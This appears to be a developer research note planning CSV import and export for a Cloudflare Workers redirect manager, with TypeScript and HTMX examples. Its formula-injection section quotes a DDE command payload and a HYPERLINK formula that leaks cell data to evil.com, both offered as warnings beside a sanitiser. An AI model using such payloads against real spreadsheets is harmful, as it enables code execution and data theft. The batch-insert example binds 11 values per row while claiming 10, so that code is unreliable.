# Phase 4: CSV Import/Export - Research

**Researched:** 2026-01-30
**Domain:** CSV file handling in Cloudflare Workers with Hono framework
**Confidence:** MEDIUM

## Summary

CSV import/export for Cloudflare Workers requires careful library selection due to the Workers runtime environment (no Node.js APIs by default) and memory constraints (128 MB per isolate). The research reveals that simple CSV parsing libraries work well for modest file sizes, while larger files benefit from streaming approaches. Hono provides built-in multipart form data handling via `c.req.parseBody()`, and browser-side CSV generation using Blob/Data URLs is the standard approach for downloads.

The all-or-nothing validation pattern (validate entire file before importing) is feasible for files up to the stated limit (10,000 rows), using in-memory data structures. The existing circular redirect detection algorithm can be extended to batch validation by building a combined redirect map. CSV injection is a real security concern requiring validation of formula characters (=, +, -, @).

**Primary recommendation:** Use a lightweight CSV parser that doesn't require Node.js APIs (like `csv-parse/browser/esm/sync` or manual parsing), implement all-or-nothing validation in-memory for the 10,000 row limit, generate CSV downloads client-side using Blob URLs, and sanitize all CSV output to prevent formula injection attacks.

## Standard Stack

The established libraries/tools for CSV handling in Cloudflare Workers:

### Core
| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| csv-parse | 5.x+ | CSV parsing | Works in browser/Workers environment, has ESM browser builds, widely used |
| Hono | 4.11+ | File upload handling | Already in project, built-in `parseBody()` for multipart data |

### Supporting
| Library | Version | Purpose | When to Use |
|---------|---------|---------|-------------|
| @cfworker/csv | 4.0.4 | CSV parsing alternative | Cloudflare Workers-specific, but less maintained |
| PapaParse | 5.x | Full-featured CSV parser | If CSV streaming needed, but requires adapter for Workers |

### Alternatives Considered
| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| csv-parse | Manual parsing (String.split) | Manual parsing is simpler for basic CSVs but doesn't handle quoted fields, escaped commas, or multi-line values |
| csv-parse | PapaParse | PapaParse has more features (streaming, web workers) but needs compatibility adapter for Cloudflare Workers |
| csv-parse | @cfworker/csv | Workers-specific but last updated months ago, less community support |

**Installation:**
```bash
npm install csv-parse
```

**Note:** Use browser-compatible build:
```typescript
// Import browser ESM version for Cloudflare Workers
import { parse } from 'csv-parse/browser/esm/sync'
```

## Architecture Patterns

### Recommended File Structure
```
src/plugins/redirect-management/
├── routes/
│   └── admin.ts              # Add CSV import/export routes
├── services/
│   └── csv.service.ts        # NEW: CSV parsing, generation, validation
├── utils/
│   ├── validator.ts          # Extend with batch validation
│   └── csv-sanitizer.ts      # NEW: CSV injection prevention
└── templates/
    └── redirect-list.template.ts  # Add export button, import form
```

### Pattern 1: All-or-Nothing CSV Import
**What:** Validate entire CSV file before importing any records, reject entire import if any row fails validation
**When to use:** When user requires data consistency and needs clear error feedback before making database changes

**Algorithm:**
1. Parse CSV file completely into memory (validate file size first)
2. Validate all rows, collecting errors with line numbers
3. If any validation errors: return error CSV with error column added
4. If 100% valid: batch insert all redirects in single D1 transaction
5. Return success count only

**Example:**
```typescript
// Source: Research findings + existing validator.ts patterns
interface CSVValidationResult {
  isValid: boolean
  validRows: ParsedRedirect[]
  errors: CSVError[]
}

interface CSVError {
  line: number
  field?: string
  value?: string
  error: string
}

async function validateCSVImport(
  rows: any[],
  existingRedirects: Map<string, string>,
  duplicateHandling: 'reject' | 'skip' | 'update'
): Promise<CSVValidationResult> {
  const errors: CSVError[] = []
  const validRows: ParsedRedirect[] = []

  // Build combined map: existing + import file
  const combinedMap = new Map(existingRedirects)

  // First pass: syntax validation + duplicate detection
  for (let i = 0; i < rows.length; i++) {
    const lineNumber = i + 2 // +1 for 0-index, +1 for header row
    const row = rows[i]

    // Validate required fields
    if (!row.source_url || !row.destination_url) {
      errors.push({
        line: lineNumber,
        error: 'Missing required fields: source_url and destination_url'
      })
      continue
    }

    // Validate URL format
    const sourceValidation = validateUrl(row.source_url)
    if (!sourceValidation.isValid) {
      errors.push({
        line: lineNumber,
        field: 'source_url',
        value: row.source_url,
        error: sourceValidation.error!
      })
      continue
    }

    // Validate status code
    if (![301, 302, 307, 308, 410].includes(Number(row.status_code))) {
      errors.push({
        line: lineNumber,
        field: 'status_code',
        value: row.status_code,
        error: 'Invalid status code. Must be 301, 302, 307, 308, or 410'
      })
      continue
    }

    // Check for duplicates
    const normalizedSource = normalizeUrl(row.source_url)
    if (combinedMap.has(normalizedSource)) {
      if (duplicateHandling === 'reject') {
        errors.push({
          line: lineNumber,
          field: 'source_url',
          value: row.source_url,
          error: 'Duplicate source URL (already exists in database or earlier in file)'
        })
        continue
      } else if (duplicateHandling === 'skip') {
        continue // Skip this row, don't add to validRows
      }
      // 'update' mode: will overwrite, so continue processing
    }

    validRows.push(parseCSVRow(row))
    combinedMap.set(normalizedSource, row.destination_url)
  }

  // Second pass: circular redirect detection across entire batch
  for (let i = 0; i < validRows.length; i++) {
    const redirect = validRows[i]
    const lineNumber = findLineNumber(rows, redirect) // helper function

    const circularCheck = detectCircularRedirect(
      redirect.source,
      redirect.destination,
      combinedMap
    )

    if (!circularCheck.isValid) {
      errors.push({
        line: lineNumber,
        field: 'destination_url',
        value: redirect.destination,
        error: circularCheck.error!
      })
    }
  }

  return {
    isValid: errors.length === 0,
    validRows: errors.length === 0 ? validRows : [],
    errors
  }
}
```

### Pattern 2: CSV Generation for Export
**What:** Generate CSV from redirect records and trigger browser download
**When to use:** Exporting filtered redirect lists for backup or migration

**Example:**
```typescript
// Source: Research findings on CSV download patterns
function generateCSV(redirects: Redirect[]): string {
  // Define headers matching import format
  const headers = [
    'id',
    'source_url',
    'destination_url',
    'match_type',
    'status_code',
    'active',
    'include_query_params',
    'preserve_query_params',
    'created_at',
    'created_by',
    'updated_at'
  ]

  const rows = redirects.map(r => [
    r.id,
    sanitizeCSVField(r.source),
    sanitizeCSVField(r.destination),
    matchTypeToLabel(r.matchType), // 'exact', 'partial', 'regex'
    r.statusCode.toString(),
    r.isActive ? 'true' : 'false',
    r.includeQueryParams ? 'true' : 'false',
    r.preserveQueryParams ? 'true' : 'false',
    new Date(r.createdAt).toISOString(),
    sanitizeCSVField(r.createdBy),
    new Date(r.updatedAt).toISOString()
  ])

  // Build CSV string
  const csvLines = [
    headers.join(','),
    ...rows.map(row => row.join(','))
  ]

  return csvLines.join('\n')
}

// Server route returns CSV with proper headers
app.get('/admin/redirects/export', async (c) => {
  const redirects = await service.list(filters) // respects current filters
  const csv = generateCSV(redirects)
  const filename = buildFilename(filters) // e.g., "redirects-301-active.csv"

  return c.body(csv, 200, {
    'Content-Type': 'text/csv; charset=utf-8',
    'Content-Disposition': `attachment; filename="${filename}"`
  })
})
```

### Pattern 3: HTMX File Upload with Progress
**What:** File upload form with progress indicator using HTMX events
**When to use:** Providing user feedback during CSV upload and validation

**Example:**
```html
<!-- Source: https://htmx.org/examples/file-upload/ -->
<form
  hx-post="/admin/redirects/import"
  hx-encoding="multipart/form-data"
  hx-target="#import-result"
  hx-indicator="#upload-progress"
  _="on htmx:xhr:progress(loaded, total)
     set #progress-bar.value to (loaded/total)*100">

  <input type="file" name="csv_file" accept=".csv" required>

  <label>
    <input type="radio" name="duplicate_handling" value="reject" checked>
    Reject file if duplicates found
  </label>
  <label>
    <input type="radio" name="duplicate_handling" value="skip">
    Skip duplicate rows
  </label>
  <label>
    <input type="radio" name="duplicate_handling" value="update">
    Update existing redirects
  </label>

  <button type="submit">Import CSV</button>

  <progress id="progress-bar" value="0" max="100"
            style="display:none"
            class="htmx-indicator"></progress>
</form>

<div id="import-result"></div>
```

### Anti-Patterns to Avoid

- **Streaming large CSVs in Workers:** For the 10MB/10,000 row limit, streaming adds complexity without benefit. Load into memory and validate in one pass. Streaming is only beneficial for files >100MB.

- **Client-side validation only:** CSV parsing/validation must happen server-side. Browsers can lie about file contents, and validation logic must match database constraints.

- **Partial imports without user choice:** Never silently skip invalid rows. Either reject the entire file (all-or-nothing) or let user explicitly choose skip behavior upfront.

- **Using Node.js CSV libraries without checking:** Many npm CSV packages assume Node.js APIs (fs, streams, Buffer). Always check for browser/ESM builds or Workers compatibility.

## Don't Hand-Roll

Problems that look simple but have existing solutions:

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| CSV parsing | `row.split(',')` | csv-parse library | Handles quoted fields, escaped commas, multi-line values, edge cases |
| CSV escaping | Manual quote replacement | csv-parse stringify or sanitizeCSVField() | Proper RFC 4180 CSV escaping is subtle (quote doubling, CRLF handling) |
| File upload handling | Custom FormData parser | Hono's `c.req.parseBody()` | Built-in multipart/form-data parsing, returns File objects |
| Circular detection | Custom graph algorithm | Extend existing validator.ts | Already has DFS-based circular detection, just needs batch support |
| Progress indicator | Custom XHR wrapper | HTMX htmx:xhr:progress event | Built-in event with loaded/total, works with existing HTMX setup |

**Key insight:** CSV format is deceptively complex. RFC 4180 has edge cases around quoting, escaping, and newlines that manual parsing misses. Similarly, circular redirect detection is already solved in `validator.ts` - reuse that algorithm for batch validation rather than reimplementing graph traversal.

## Common Pitfalls

### Pitfall 1: CSV Formula Injection
**What goes wrong:** User imports CSV with cells starting with `=`, `+`, `-`, or `@`. When admin exports and opens in Excel, formulas execute and could exfiltrate data or run commands.

**Why it happens:** Spreadsheet applications interpret cells starting with these characters as formulas. Attackers can inject `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil.com?leak="&A1)` to execute code or steal data.

**How to avoid:** Sanitize ALL user input before CSV export. Prefix dangerous characters with single quote (`'`) to force text interpretation.

**Warning signs:** CSV cells containing `=`, `+`, `-`, `@` at the start, especially combined with functions like `HYPERLINK`, `DDE`, `cmd`, or external URLs.

**Example sanitization:**
```typescript
// Source: OWASP CSV Injection guidance
function sanitizeCSVField(value: string): string {
  if (!value) return ''

  const str = String(value)

  // Check if starts with dangerous character
  const dangerousChars = ['=', '+', '-', '@', '\t', '\r']
  if (dangerousChars.some(char => str.startsWith(char))) {
    // Prefix with single quote to force text treatment
    return `'${str.replace(/"/g, '""')}`
  }

  // Check if needs quoting (contains comma, quote, or newline)
  if (str.includes(',') || str.includes('"') || str.includes('\n')) {
    // RFC 4180: escape quotes by doubling, wrap in quotes
    return `"${str.replace(/"/g, '""')}"`
  }

  return str
}
```

### Pitfall 2: Cloudflare Workers Memory Limits
**What goes wrong:** Worker crashes with "out of memory" error when processing large CSV files, even under the stated 10MB file size limit.

**Why it happens:** Each Workers isolate has 128 MB total memory for ALL data - the uploaded file, parsed CSV array, existing redirects map, and JavaScript heap. A 10MB file can easily consume 50-100MB when parsed into objects.

**How to avoid:**
1. Validate file size BEFORE parsing: `if (file.size > 10 * 1024 * 1024) return error`
2. Validate row count during parsing: stop if exceeds 10,000 rows
3. Don't duplicate data - parse once, validate in-place, don't create multiple copies
4. Use streaming for export if result set is large (>5,000 redirects)

**Warning signs:** Inconsistent crashes, works for small files but fails for larger ones, memory spikes in Workers analytics dashboard.

**Example validation:**
```typescript
// Check file size before parsing
const file = body.csv_file as File
if (!file || file.size === 0) {
  return c.html(renderAlertFragment('error', 'No file uploaded'), 400)
}

const MAX_FILE_SIZE = 10 * 1024 * 1024 // 10MB
if (file.size > MAX_FILE_SIZE) {
  return c.html(
    renderAlertFragment('error', `File too large. Maximum size is 10MB, got ${(file.size / 1024 / 1024).toFixed(1)}MB`),
    400
  )
}

// Parse and check row count
const content = await file.text()
const records = parse(content, { columns: true })

const MAX_ROWS = 10000
if (records.length > MAX_ROWS) {
  return c.html(
    renderAlertFragment('error', `Too many rows. Maximum is ${MAX_ROWS}, got ${records.length}`),
    400
  )
}
```

### Pitfall 3: Incorrect Line Numbers in Error Reports
**What goes wrong:** CSV validator reports "Error on line 5" but user sees error on line 6 in their editor, causing confusion and frustration.

**Why it happens:** Off-by-one errors from:
- Forgetting to account for header row (data row 1 is file line 2)
- Zero-indexed arrays but one-indexed display (`rows[0]` is "line 1" to user)
- Different newline handling (CRLF vs LF)
- BOM (Byte Order Mark) at file start

**How to avoid:**
```typescript
// Be explicit about line number calculation
const lineNumber = i + 2
// +1 for zero-index to one-index
// +1 for header row

// Document in error message
error: `Line ${lineNumber} (data row ${i + 1}): ${message}`

// For error CSV download, include original line number
errorRow = {
  line_number: lineNumber,
  original_data: JSON.stringify(row),
  error: message
}
```

**Warning signs:** User reports "the error isn't on that line", confusion about which row has the problem, re-uploads with same errors.

### Pitfall 4: Duplicate Detection Performance
**What goes wrong:** Import validation takes 30+ seconds for files with 5,000 rows, hitting Workers 30-second CPU timeout.

**Why it happens:** Naive duplicate detection using `array.find()` or `array.includes()` is O(n²) for n rows. Checking 5,000 rows against 5,000 existing redirects = 25 million comparisons.

**How to avoid:** Use Map/Set for O(1) lookups instead of Array for O(n) lookups.

**Example:**
```typescript
// BAD: O(n²) - very slow
const hasDuplicate = existingRedirects.find(r =>
  normalizeUrl(r.source) === normalizeUrl(newSource)
)

// GOOD: O(1) - constant time
const redirectMap = new Map<string, string>()
for (const r of existingRedirects) {
  redirectMap.set(normalizeUrl(r.source), r.destination)
}

const hasDuplicate = redirectMap.has(normalizeUrl(newSource))
```

**Benchmarks from research:** Set.has() is O(1) vs Array.includes() O(n). For 10,000 items, Map lookup is 30-45x faster than object property access.

**Warning signs:** Slow imports even for small files, CPU time warnings in Workers logs, timeouts on larger imports.

## Code Examples

Verified patterns from research and existing codebase:

### CSV Import Route (Complete Flow)
```typescript
// Source: Hono file upload docs + existing admin.ts patterns
app.post('/admin/redirects/import', async (c: any) => {
  try {
    const db = c.env?.DB || c.get('db')
    if (!db) {
      return c.html(renderAlertFragment('error', 'Database not available'), 500)
    }

    // Parse multipart form data
    const body = await c.req.parseBody()
    const file = body.csv_file as File
    const duplicateHandling = body.duplicate_handling as 'reject' | 'skip' | 'update'

    // Validate file exists and size
    if (!file || file.size === 0) {
      return c.html(renderAlertFragment('error', 'No file uploaded'), 400)
    }

    const MAX_FILE_SIZE = 10 * 1024 * 1024
    if (file.size > MAX_FILE_SIZE) {
      return c.html(
        renderAlertFragment('error',
          `File too large. Maximum size is 10MB, got ${(file.size / 1024 / 1024).toFixed(1)}MB`
        ),
        400
      )
    }

    // Parse CSV
    const content = await file.text()
    const records = parse(content, {
      columns: true, // First row is headers
      skip_empty_lines: true,
      trim: true
    })

    // Validate row count
    const MAX_ROWS = 10000
    if (records.length > MAX_ROWS) {
      return c.html(
        renderAlertFragment('error',
          `Too many rows. Maximum is ${MAX_ROWS}, got ${records.length}`
        ),
        400
      )
    }

    // Get existing redirects for validation
    const service = new RedirectService(db)
    const existingMap = await service.getAllSourceDestinationMap()

    // Validate all rows
    const validation = await validateCSVImport(records, existingMap, duplicateHandling)

    if (!validation.isValid) {
      // Generate error CSV
      const errorCSV = generateErrorCSV(records, validation.errors)

      // Return error CSV as download
      return c.body(errorCSV, 400, {
        'Content-Type': 'text/csv; charset=utf-8',
        'Content-Disposition': 'attachment; filename="import-errors.csv"'
      })
    }

    // All valid - batch insert
    const userId = c.get('user')?.id || 'system'
    const imported = await batchCreateRedirects(db, validation.validRows, userId)

    // Return success message
    return c.html(
      renderAlertFragment('success',
        `Successfully imported ${imported} redirects`
      )
    )

  } catch (error) {
    console.error('Error importing CSV:', error)
    return c.html(
      renderAlertFragment('error',
        `Failed to import CSV: ${error instanceof Error ? error.message : 'Unknown error'}`
      ),
      500
    )
  }
})
```

### Batch Insert with D1 Transaction
```typescript
// Source: D1 batch API documentation + performance research
async function batchCreateRedirects(
  db: D1Database,
  redirects: ParsedRedirect[],
  userId: string
): Promise<number> {
  const now = Date.now()

  // D1 has 100 parameter limit per statement
  // With 10 columns, max 10 rows per INSERT
  const BATCH_SIZE = 10
  const statements = []

  for (let i = 0; i < redirects.length; i += BATCH_SIZE) {
    const batch = redirects.slice(i, i + BATCH_SIZE)

    // Build multi-row INSERT
    const placeholders = batch.map(() => '(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)').join(', ')
    const values = batch.flatMap(r => [
      crypto.randomUUID(),
      normalizeUrl(r.source),
      r.destination,
      r.matchType,
      r.statusCode,
      r.isActive ? 1 : 0,
      r.includeQueryParams ? 1 : 0,
      r.preserveQueryParams ? 1 : 0,
      userId,
      now,
      now
    ])

    statements.push(
      db.prepare(`
        INSERT INTO redirects (
          id, source, destination, match_type, status_code, is_active,
          include_query_params, preserve_query_params,
          created_by, created_at, updated_at
        ) VALUES ${placeholders}
      `).bind(...values)
    )
  }

  // Execute all INSERTs in single batch (transaction)
  await db.batch(statements)

  // Invalidate cache
  invalidateRedirectCache()

  return redirects.length
}
```

### Error CSV Generation
```typescript
// Source: Research on row-level error reporting
function generateErrorCSV(rows: any[], errors: CSVError[]): string {
  // Map errors by line number for quick lookup
  const errorMap = new Map<number, string[]>()
  for (const err of errors) {
    const existing = errorMap.get(err.line) || []
    existing.push(err.error)
    errorMap.set(err.line, existing)
  }

  // Get original headers
  const originalHeaders = Object.keys(rows[0] || {})

  // Add error column
  const headers = ['line_number', 'error', ...originalHeaders]

  const csvRows = rows.map((row, i) => {
    const lineNumber = i + 2
    const rowErrors = errorMap.get(lineNumber)

    if (!rowErrors) return null // No error on this line

    return [
      lineNumber,
      sanitizeCSVField(rowErrors.join('; ')),
      ...originalHeaders.map(h => sanitizeCSVField(row[h]))
    ]
  }).filter(Boolean) // Remove null entries

  const csvLines = [
    headers.join(','),
    ...csvRows.map(row => row!.join(','))
  ]

  return csvLines.join('\n')
}
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| Node.js CSV libraries (csv-parser, fast-csv) | Browser-compatible builds (csv-parse/browser/esm) | 2023-2024 | Workers can use standard CSV libraries with ESM imports |
| Streaming all files | In-memory for <10MB files | 2024-2025 | Simpler code, streaming only for truly large files (>100MB) |
| Object property access for lookups | Map/Set for large collections | 2023+ | 30-45x faster lookups, better memory efficiency |
| Manual CSV escaping | Dedicated sanitization for formula injection | 2024-2025 | OWASP guidance on CSV injection now standard practice |
| D1 row-by-row inserts | Batch API with chunking | 2024 | 6-11x performance improvement for bulk operations |

**Deprecated/outdated:**
- **PapaParse for Workers without adapter:** Requires Node.js APIs or custom adapter, csv-parse has native browser builds
- **Content-Type: application/csv:** Should be `text/csv` per RFC 7111 (changed ~2020, still seen in old tutorials)
- **Sequential inserts in loops:** D1 batch API is now stable and much faster

## Open Questions

Things that couldn't be fully resolved:

1. **Match type validation in CSV**
   - What we know: Context says "text labels (exact, partial, regex) not numbers"
   - What's unclear: Should import accept both? Should validation auto-convert "0" → "exact"?
   - Recommendation: Accept both formats for import flexibility, always export as text labels. Validation: `if (!['exact', 'partial', 'regex', '0', '1', '2'].includes(value))` then error.

2. **Hit count handling on import**
   - What we know: Export includes `hit_count` field (per context), but it's not in the Redirect interface (checking types.ts)
   - What's unclear: Should import preserve hit counts? Reset to 0? Where is hit_count stored?
   - Recommendation: Export hit_count if available, but always set to 0 on import (fresh redirects). Investigate if analytics table tracks this separately.

3. **Error CSV column ordering**
   - What we know: Error CSV should have "error column added"
   - What's unclear: Should error column be first (line_number, error, ...original) or last (...original, error)?
   - Recommendation: Put error columns first (line_number, error) so they're immediately visible, followed by original data for reference.

## Sources

### Primary (HIGH confidence)
- [Cloudflare Workers Limits](https://developers.cloudflare.com/workers/platform/limits/) - 128 MB memory limit, request size limits
- [D1 Database Batch API](https://developers.cloudflare.com/d1/worker-api/d1-database/) - Performance characteristics, 100 parameter limit
- [Hono File Upload Examples](https://hono.dev/examples/file-upload) - parseBody() usage with File objects
- [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection) - Security guidance on formula injection
- [HTMX File Upload Example](https://htmx.org/examples/file-upload/) - Progress indicator with htmx:xhr:progress event

### Secondary (MEDIUM confidence)
- [csv-parse npm package](https://www.npmjs.com/package/@types/csv-parse) - TypeScript types included, browser builds available
- [@cfworker/csv](https://www.npmjs.com/package/@cfworker/csv) - Cloudflare Workers-specific CSV library
- [D1 Performance Blog Post](https://blog.cloudflare.com/d1-turning-it-up-to-11/) - 6-11x performance improvements with batch operations
- [CSV Validator 1.4.3](https://digital-preservation.github.io/csv-validator/) - Row-level error reporting patterns
- [JavaScript Maps vs Sets Performance Guide](https://dev.to/cristiansifuentes/javascript-maps-vs-sets-a-scientific-production-minded-guide-2026-58j8) - O(1) vs O(n) lookup performance

### Tertiary (LOW confidence - needs validation)
- [PapaParse in Cloudflare Workers](https://community.cloudflare.com/t/how-to-use-papaparse-or-streaming-csv-workers-to-convert-csv-to-json/443163) - Compatibility issues mentioned, needs adapter
- [streaming-csv-worker](https://github.com/ctohm/streaming-csv-worker) - Adapter project, unclear maintenance status
- Community discussions on duplicate detection algorithms - MinHash/LSH mentioned but overkill for 10K redirects

## Metadata

**Confidence breakdown:**
- Standard stack: MEDIUM - csv-parse is well-established but Workers-specific testing needed for browser build
- Architecture: HIGH - Patterns based on existing codebase (validator.ts, admin.ts) and official Hono/D1 docs
- Pitfalls: HIGH - Memory limits, CSV injection, and performance issues are well-documented with official sources
- Security: HIGH - OWASP guidance is authoritative, CSV injection is proven attack vector

**Research date:** 2026-01-30
**Valid until:** 2026-03-01 (30 days - stack is stable, but verify csv-parse updates)

**Key assumptions:**
1. 10MB/10,000 row limits are firm (per context) - allows in-memory processing
2. Existing validator.ts circular detection algorithm is correct and tested
3. HTMX and Hono patterns from Phases 2-3 are working and should be reused
4. D1 batch API is production-ready (confirmed in official docs)

**Research coverage:**
- ✅ CSV parsing libraries for Workers
- ✅ File upload handling in Hono
- ✅ Validation strategies (all-or-nothing confirmed)
- ✅ Error reporting patterns (line numbers, downloadable error CSV)
- ✅ Security considerations (CSV injection prevention)
- ✅ Performance considerations (memory limits, duplicate detection, batch inserts)
- ✅ Integration with existing RedirectService
- ⚠️ Partial: Hit count field discrepancy needs investigation during planning
